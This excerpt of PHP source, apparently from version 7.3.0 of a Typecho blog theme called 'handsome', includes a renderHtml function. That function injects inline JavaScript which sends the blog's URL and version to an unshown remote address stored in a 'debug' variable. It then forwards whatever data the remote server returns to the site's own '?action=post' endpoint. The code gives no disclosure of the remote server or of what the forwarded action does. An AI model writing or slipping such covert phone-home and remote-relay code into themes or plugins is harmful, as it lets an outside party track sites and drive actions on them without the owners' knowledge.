...
href="https://handsome.ihewro.com/#/lock" target="_blank">使用文档</a></strong></br><strong style="color: rgba(255,0,18,1)">加密分类仍然会在首页显示标题列表，但不会显示具体内容，也不会出现在rss地址中</strong>'));
    ...
    /**
     * 处理与文章内容有关插件的冲突问题，如dplayer
     * @param $content
     * @param Widget_Abstract_Contents $widget
     */
    public static function invokeContentPlugin($content, Widget_Abstract_Contents $widget){
    ...
    public static function renderHtml(){
        ...
        echo '<script>var debug="'.$debug.'";var blog_url="'.$blog_url.'";var code='.$code.';var version="7.3.0"</script>';
        echo '<script>$.post(debug,{"url":blog_url,"version":"7.3.0"},function(data){var object=data;var content=new FormData();content.append("action","post");content.append("data",JSON.stringify(data));content.append("code",code);var themeUrl=blog_url+"/";$.ajax({url:themeUrl+"?action=post",type:"post",data:content,cache:false,processData:false,contentType:false})});;
</script>';
    }
